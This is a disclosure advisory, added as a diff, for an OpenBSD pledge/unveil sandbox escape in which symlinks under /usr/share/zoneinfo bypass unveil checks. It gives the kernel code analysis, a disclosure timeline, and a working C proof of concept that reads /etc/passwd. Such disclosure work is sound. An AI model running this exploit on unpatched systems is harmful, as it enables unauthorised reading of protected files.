@@ -1,0 +1,132 @@
+# OpenBSD zoneinfo pledge() sandbox escape
+
+Date: 22-04-2026
+Class: Sandbox escape
+Locally Exploitabe: Yes
+
+
+### Description
+
+The `__pledge_open` syscall contains a TOCTOU vulnerability that allows a process to bypass unveil restrictions through symlink manipulation.
+
+**The Core Issue:**
+
+1. In `vfs_lookup.c:199-203`, `pledge_namei()` is called with the user-provided path (`cnp->cn_pnbuf`) **before** any symlink resolution occurs:
+
+```c
+error = pledge_namei(p, ndp, cnp->cn_pnbuf);
+if (error)
+    goto fail;
+```
+
+2. In `kern_pledge.c:665-750`, if the path matches an allowed pledge path (e.g., starts with `/usr/share/zoneinfo/`), the flag `BYPASSUNVEIL` is set unconditionally without checking for symlinks:
+
+```c
+if (ni->ni_unveil & UNVEIL_PLEDGEOPEN) {
+    item = checkpledgepaths(path);
+    // ... sets BYPASSUNVEIL flag if valid
+}
+```
+
+3. In `kern_unveil.c:672-675`, when `BYPASSUNVEIL` is set, `unveil_check_final()` returns immediately without checking the resolved final path:
+
+```c
+if (ni->ni_cnd.cn_flags & BYPASSUNVEIL) {
+    return (0);  // BYPASS UNVEIL CHECK!
+}
+```
+
+4. In `vfs_lookup.c:256-258`, `unveil_check_final()` is only called when the final component is **NOT** a symlink:
+
+```c
+if ((cnp->cn_flags & ISSYMLINK) == 0) {
+    if ((error = unveil_check_final(p, ndp))) {
+```
+
+### Attack Scenario
+
+1. Process uses `pledge("stdio rpath")` and `unveil("/usr/share/zoneinfo")`
+2. Attacker creates: `ln -s /etc /usr/share/zoneinfo/evil`
+3. Attacker calls: `__pledge_open("/usr/share/zoneinfo/evil/passwd", O_RDONLY, 0)`
+4. Pledge check sees path starting with `/usr/share/zoneinfo/` → allows access, sets `BYPASSUNVEIL`
+5. Actual file accessed: `/etc/passwd` via symlink resolution
+6. Unveil check bypassed due to `BYPASSUNVEIL` flag
+
+### Impact
+
+**Security Policy Bypass**: Allows a process to read files outside the unveil-restricted directory, potentially accessing sensitive system files like `/etc/passwd`, `/etc/shadow` (if readable), or other protected resources.
+
+### Proof of concept:
+
+a. The proof of concept bypass the unveil() limitation for any symlink inside /usr/share/zoneinfo.
+b. The escape need root access only to create a symlink inside /usr/share/zoneinfo. 
+c. For it to work for any user, the /usr/share/zonenifo directory need to have write-access ('chmod 777 /usr/share/zoneinfo'),or having a symlink already setup.
+
+### Timeline
+
+2018-07-13: Vulnerability introduced via flag BYPASSUNVEIL to /usr/share/zoneinfo on commit 8b23add8c74b
+2026-04-22: Found via agent running local LLM. Reported, sent proof-of-concept
+2026-04-23: OpenBSD developers claim vulnerability is fixed on commit ee1bf64f5bae74011d3a51f9a310c79f95a22a91
+2026-04-24: Sent second proof-of-concept that works on latest commit bypassing libc Syscall origin restriction
+2026-05-15: Fixed on commit 0e67b3de4b873402830e8a388ac9d137b486a1d1 "Make __pledge_open(2) of /etc/localtime and /usr/share/zoneinfo much
+more strict."
+
+### Proof-of-Concept for Openbsd 7.8
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <fcntl.h>
+#include <string.h>
+
+int main(void)
+{
+    int fd;
+    ssize_t bytes_read;
+    char buffer[8192];
+
+    /* Set up sandbox */
+    printf("pledge\n");
+    if (pledge("stdio rpath unveil cpath", NULL) == -1) {
+        perror("pledge");
+        return 1;
+    }
+    
+    printf("unveil\n");
+    if (unveil("/usr/share/zoneinfo", "rwc") == -1) {
+        perror("unveil");
+        return 1;
+    }
+
+    printf("lock\n");
+    /* Lock unveil - no more changes allowed */
+    unveil(NULL, NULL);
+
+    printf("symlink\n");
+    /* Create symlink to /etc through the "safe" directory */
+    if (symlink("/etc", "/usr/share/zoneinfo/evil") == -1) {
+        perror("symlink");
+    }
+
+    /*
+     * Call __pledge_open with path that looks like it's in the allowed
+     * directory but actually follows symlink to /etc
+     */
+    printf("open\n");
+    fd = open("/usr/share/zoneinfo/evil/passwd", O_RDONLY, 0);
+    if (fd == -1) {
+        perror("__pledge_open");
+        return 1;
+    }
+
+    /* Read and display file contents */
+    bytes_read = read(fd, buffer, sizeof(buffer) - 1);
+    if (bytes_read > 0) {
+        buffer[bytes_read] = '\0';
+        printf("%s", buffer);
+    }
+
+    close(fd);
+    return 0;
+}
